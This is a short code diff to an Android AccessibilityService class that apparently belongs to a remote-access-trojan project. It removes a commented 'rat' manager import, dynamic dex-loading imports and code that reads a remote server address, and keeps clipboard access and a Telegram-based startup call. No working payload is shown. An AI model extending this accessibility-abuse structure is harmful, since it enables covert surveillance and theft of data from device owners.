@@ -1,46 +1,19 @@
 package com.hhm.android.otherapp;
 
 import android.accessibilityservice.AccessibilityService;
-import android.accessibilityservice.AccessibilityServiceInfo;
 import android.annotation.SuppressLint;
-import android.app.Activity;
-import android.app.ActivityManager;
 import android.app.Service;
 import android.content.ClipData;
-import android.content.ClipDescription;
 import android.content.ClipboardManager;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.res.AssetManager;
 import android.os.Build;
-import android.os.IBinder;
 import android.os.PowerManager;
-import android.support.annotation.Nullable;
-import android.support.v4.app.ActivityCompat;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
-//import com.hhm.android.rat.ratManager;
-
-import com.google.gson.Gson;
 import com.hhm.android.otherapp.sqlite.SQLiteDao;
-import com.hhm.android.otherapp.utils.AssetsUtil;
-
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Method;
-import java.util.List;
-import java.util.logging.Logger;
-
-import dalvik.system.DexClassLoader;
-
-import static com.hhm.android.otherapp.managers.AppsManager.getApplicationNameByPackageName;
 
 
 /**
@@ -68,8 +41,6 @@ public class myService extends AccessibilityService{
     @Override
     public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
         SQLiteDao.setInstance(this); // 初始化数据库
-        ServiceConfig.setRemoteAddress(AssetsUtil.getRemoteAddressFromAssets(this));
-        ServiceConfig.setPackages(AssetsUtil.getPackageNamesFromAssets(this));
         System.out.println("启动TelegramManager");
         mContext = this;
         TelegramManager.startAsync(this);
